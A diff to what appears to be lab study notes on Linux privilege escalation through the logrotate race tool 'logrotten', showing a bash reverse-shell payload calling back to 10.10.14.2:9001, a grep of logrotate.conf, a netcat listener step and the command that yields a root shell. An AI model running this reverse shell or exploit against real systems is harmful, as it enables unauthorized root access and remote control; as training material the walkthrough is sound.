@@ -438,4 +438,18 @@ Now we need a payload to be executed
 logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
 ```
 
-Then we we need to determine which option `logrotate` uses in `logrotate.conf`
+Then we we need to determine which option `logrotate` uses in `logrotate.conf ->`
+
+```shell-session
+logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
+```
+
+Let's say it is `create`
+
+Now we can launch a listener with netcat on our attackbox and launch our payload ->
+
+```shell-session
+logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log
+```
+
+and if everything is good we should get a shell as root
